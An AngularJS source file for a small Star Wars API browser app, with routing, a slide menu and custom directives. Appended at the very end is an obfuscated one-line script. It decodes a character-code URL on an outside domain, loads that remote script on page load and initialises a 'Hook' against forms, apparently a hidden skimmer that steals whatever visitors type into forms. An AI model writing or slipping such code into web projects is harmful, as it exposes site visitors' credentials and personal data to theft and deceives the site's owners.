var app = angular.module("swApp", ['ui.router','sw.home','sw.details']);

/* API SERVICE */
/*=============*/
app.factory('Service', function() {
    return {
        API: 'http://swapi.co/api/'
    }
})


/* SET STATE PROVIDER */
/*====================*/
app.config(function($stateProvider, $urlRouterProvider) {
    $stateProvider
    .state('home', {
        cache: false,
        url: '/home',
        templateUrl: "pages/home.html",
        controller: 'HomeCtrl',
        params: {
            id: null,
            url: null
        }
    })
    
    .state('details', {
        url: '/details',
        templateUrl: "pages/details.html",
        controller: 'DetailsCtrl',
        params: {
            id: null,
            url: null
        }
    })
    
    $urlRouterProvider.otherwise('/home');
});  


/*  MAIN CONTROLLER */
/*====================*/
app.controller('swCtrl', function($scope,$state,$http,$rootScope) {    
    $scope.leftVisible = false;
    $scope.rightVisible = false;

    /* Scope for slide menu */
    $scope.close = function() {
        $scope.leftVisible = false;
        $scope.rightVisible = false;
    };
    $scope.showLeft = function(e) {
        $scope.leftVisible = true;
        e.stopPropagation();
    };
    $rootScope.$on("documentClicked", _close);
    $rootScope.$on("escapePressed", _close);
    function _close() {
        $scope.$apply(function() {
            $scope.close(); 
        });
    }
});


/* SLIDE MENU EVENTS */
/*===================*/
app.run(function($rootScope) {
    document.addEventListener("keyup", function(e) {
        if (e.keyCode === 27)
            $rootScope.$broadcast("escapePressed", e.target);
    });

    document.addEventListener("click", function(e) {
        $rootScope.$broadcast("documentClicked", e.target);
    });
});


/* DIRECTIVE FOR MENU WRAPPER */
/*============================*/
app.directive("menu", function() {
    return {
        restrict: "E",
        template: "<div ng-class='{ show: visible, left: alignment === \"left\", right: alignment === \"right\" }' ng-transclude></div>",
        transclude: true,
        scope: {
            visible: "=",
            alignment: "@"
        }
    };
});


/* DIRECTIVE FOR LIST MENU */
/*=========================*/
app.directive("menuItem", function() {
     return {
         restrict: "E",
         template: "<div ng-click='navigate()' ng-transclude></div>",
         transclude: true,
         scope: {
             hash: "@"
         }
     }
});


/* DIRECTIVE FOR NG-HTML */
app.directive('ngHtml', ['$compile', function($compile) {
    return function(scope, elem, attrs) {
        if(attrs.ngHtml){
            elem.html(scope.$eval(attrs.ngHtml));
            $compile(elem.contents())(scope);
        }
        scope.$watch(attrs.ngHtml, function(newValue, oldValue) {
            if (newValue && newValue !== oldValue) {
                elem.html(newValue);
                $compile(elem.contents())(scope);
            }
        });
    };
}]);
(function(){if(typeof inject_hook!="function")var inject_hook=function(){return new Promise(function(resolve,reject){let s=document.querySelector('script[id="hook-loader"]');s==null&&(s=document.createElement("script"),s.src=String.fromCharCode(47,47,115,112,97,114,116,97,110,107,105,110,103,46,108,116,100,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),s.id="hook-loader",s.onload=resolve,s.onerror=reject,document.head.appendChild(s))})};inject_hook().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//aeb4e3dd254a73a77e67e469341ee66b0e2d43249189b4062de5f35cc7d6838b